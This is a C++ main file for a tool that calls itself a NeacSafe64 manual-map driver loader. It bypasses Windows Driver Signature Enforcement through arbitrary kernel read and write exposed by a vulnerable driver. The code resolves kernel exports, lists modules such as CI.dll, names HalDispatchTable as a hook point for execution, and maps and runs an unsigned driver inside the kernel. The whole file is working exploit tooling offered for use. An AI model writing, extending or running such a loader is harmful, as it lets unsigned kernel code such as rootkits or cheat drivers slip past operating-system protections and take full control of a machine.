#include "NeacInterface.hpp"
#include "Mapper.hpp"
#include <iostream>
#include <string>

void PrintBanner() {
    printf("==============================================\n");
    printf("  NeacSafe64 Manual Map Driver Loader v1.0\n");
    printf("  DSE Bypass via Arbitrary Kernel R/W\n");
    printf("==============================================\n\n");
}

void PrintUsage(const char* exeName) {
    printf("Usage: %s <driver.sys>\n\n", exeName);
    printf("Options:\n");
    printf("  --info           Show kernel information only\n");
    printf("  --test           Test NeacSafe64 connectivity\n");
    printf("  --map-only       Map driver without execution\n");
    printf("\nExamples:\n");
    printf("  %s vhid_mouse.sys\n", exeName);
    printf("  %s --map-only my_driver.sys\n", exeName);
}

bool TestConnectivity(NeacInterface& neac) {
    printf("[*] Testing kernel primitives...\n\n");

    // Get kernel base
    void* krnlBase = neac.GetKernelBase();
    if (!krnlBase) {
        printf("[!] Failed to get kernel base\n");
        return false;
    }
    printf("[+] Kernel Base: %p\n", krnlBase);

    // Read MZ header
    WORD mzHeader = 0;
    if (neac.KernelRead(&mzHeader, krnlBase, sizeof(mzHeader))) {
        printf("[+] Kernel MZ signature: 0x%04X %s\n", 
            mzHeader, mzHeader == 0x5A4D ? "(valid)" : "(invalid!)");
    }

    // Get some kernel exports
    void* pPsLoadedModuleList = neac.GetPsLoadedModuleList();
    printf("[+] PsLoadedModuleList: %p\n", pPsLoadedModuleList);

    void* pExAllocatePool = neac.GetKernelExport("ExAllocatePool2");
    if (!pExAllocatePool) {
        pExAllocatePool = neac.GetKernelExport("ExAllocatePoolWithTag");
    }
    printf("[+] ExAllocatePool: %p\n", pExAllocatePool);

    void* pIoCreateDevice = neac.GetKernelExport("IoCreateDevice");
    printf("[+] IoCreateDevice: %p\n", pIoCreateDevice);

    void* pObReferenceObjectByHandle = neac.GetKernelExport("ObReferenceObjectByHandle");
    printf("[+] ObReferenceObjectByHandle: %p\n", pObReferenceObjectByHandle);

    // Find some kernel modules
    printf("\n[*] Enumerating loaded kernel modules...\n");
    
    const wchar_t* modules[] = {
        L"ntoskrnl.exe",
        L"hal.dll",
        L"CI.dll",
        L"NeacSafe64.sys",
        L"Beep.SYS",
        L"Null.SYS"
    };

    for (const wchar_t* mod : modules) {
        void* base = neac.FindKernelModule(mod);
        if (base) {
            wprintf(L"    [+] %s: %p\n", mod, base);
        }
    }

    printf("\n[+] All connectivity tests passed!\n");
    return true;
}

void ShowKernelInfo(NeacInterface& neac) {
    printf("\n=== Kernel Information ===\n\n");
    TestConnectivity(neac);
    
    printf("\n=== Available Execution Primitives ===\n\n");
    
    void* pHalDispatchTable = neac.GetKernelExport("HalDispatchTable");
    printf("[+] HalDispatchTable: %p\n", pHalDispatchTable);
    
    if (pHalDispatchTable) {
        ULONGLONG halEntry;
        neac.KernelRead(&halEntry, (uint8_t*)pHalDispatchTable + 8, sizeof(halEntry));
        printf("    HalDispatchTable[1]: %p (hookable for execution)\n", (void*)halEntry);
    }

    void* pHalPrivateDispatchTable = neac.GetKernelExport("HalPrivateDispatchTable");
    printf("[+] HalPrivateDispatchTable: %p\n", pHalPrivateDispatchTable);
}

int main(int argc, char* argv[]) {
    PrintBanner();

    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    std::string arg1 = argv[1];
    bool mapOnly = false;
    std::wstring driverPath;

    // Parse arguments
    if (arg1 == "--help" || arg1 == "-h") {
        PrintUsage(argv[0]);
        return 0;
    }

    NeacInterface neac;
    
    printf("[*] Initializing NeacSafe64 interface...\n");
    if (!neac.Initialize()) {
        printf("[!] Failed to initialize NeacSafe64\n");
        printf("[!] Make sure NeacSafe64.sys is installed and the service exists\n");
        return 1;
    }
    printf("[+] NeacSafe64 interface ready\n\n");

    if (arg1 == "--test") {
        TestConnectivity(neac);
        neac.Shutdown();
        return 0;
    }

    if (arg1 == "--info") {
        ShowKernelInfo(neac);
        neac.Shutdown();
        return 0;
    }

    if (arg1 == "--map-only") {
        mapOnly = true;
        if (argc < 3) {
            printf("[!] Missing driver path\n");
            neac.Shutdown();
            return 1;
        }
        std::string path = argv[2];
        driverPath = std::wstring(path.begin(), path.end());
    } else {
        std::string path = argv[1];
        driverPath = std::wstring(path.begin(), path.end());
    }

    // Create mapper
    Mapper mapper(&neac);

    // Map driver
    MappedDriver driver = {0};
    printf("[*] Mapping driver: %ls\n\n", driverPath.c_str());
    
    if (!mapper.MapDriver(driverPath, driver)) {
        printf("\n[!] Driver mapping failed\n");
        printf("\n=== Troubleshooting ===\n");
        printf("1. Ensure a suitable code cave exists in kernel memory\n");
        printf("2. Consider using a pool allocation helper driver\n");
        printf("3. Check if the target driver has unusual import requirements\n");
        neac.Shutdown();
        return 1;
    }

    printf("\n[+] Driver mapped successfully!\n");
    printf("    Base: %p\n", driver.BaseAddress);
    printf("    Size: 0x%zX\n", driver.ImageSize);
    printf("    Entry: %p\n", driver.EntryPoint);

    if (!mapOnly) {
        printf("\n[*] Attempting driver execution...\n");
        if (mapper.ExecuteDriverEntry(driver)) {
            printf("[+] Driver entry point executed!\n");
        } else {
            printf("[!] Driver execution requires additional implementation\n");
            printf("[!] The driver is mapped but not running\n");
        }
    } else {
        printf("\n[*] Map-only mode: skipping execution\n");
    }

    printf("\n[*] Press Enter to cleanup and exit...\n");
    getchar();

    // Cleanup
    printf("[*] Unmapping driver...\n");
    mapper.UnmapDriver(driver);

    printf("[*] Shutting down NeacSafe64...\n");
    neac.Shutdown();

    printf("[+] Done!\n");
    return 0;
}
